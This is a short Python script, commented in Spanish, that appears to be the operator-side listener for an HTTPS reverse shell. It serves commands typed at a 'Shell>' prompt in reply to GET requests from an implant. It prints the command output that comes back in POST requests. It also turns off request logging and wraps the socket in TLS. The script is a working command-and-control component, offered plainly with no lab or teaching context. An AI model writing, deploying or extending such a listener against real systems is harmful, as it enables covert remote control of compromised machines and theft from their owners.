from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any
from urllib.parse import parse_qs
import ssl

# Dirección IP y puerto donde el servidor estará escuchando
server_ip = "0.0.0.0"
server_port = 8080

class MyHandler(BaseHTTPRequestHandler):
    """Manejador personalizado para HTTP requests.

    Métodos:
        log_message: Suprime la salida de los mensajes de log por defecto.
        do_GET: Maneja las peticiones GET.
        do_POST: Maneja las peticiones POST procesando los datos recibidos.
    """

    def log_message(self, format, *args):
        """Suprime los mensajes de registro por defecto del servidor HTTP.

        Args:
            format: Cadena de formato para el mensaje.
            *args: Argumentos adicionales para el mensaje.
        """
        pass

    def do_GET(self):
        """Procesa las peticiones GET enviando una entrada de usuario como respuesta HTTP."""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(input("Shell> ").encode())

    def do_POST(self):
        """Procesa las peticiones POST leyendo los datos enviados y mostrando una respuesta.
        """
        content_length = int(self.headers['Content-Length'])  # Tamaño del contenido
        data = parse_qs(self.rfile.read(content_length).decode())  # Datos recibidos
        self.send_response(200)
        self.end_headers()
        if "response" in data:
            print(data["response"][0])
        else:
            print(data)

if __name__ == "__main__":
    server = HTTPServer((server_ip, server_port), MyHandler)

    # Configuración SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="server.pem")

    server.socket = context.wrap_socket(server.socket, server_side=True)
    print(f"Escuchando conexiones en {server_ip}:{server_port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Servidor finalizado.")
        server.server_close()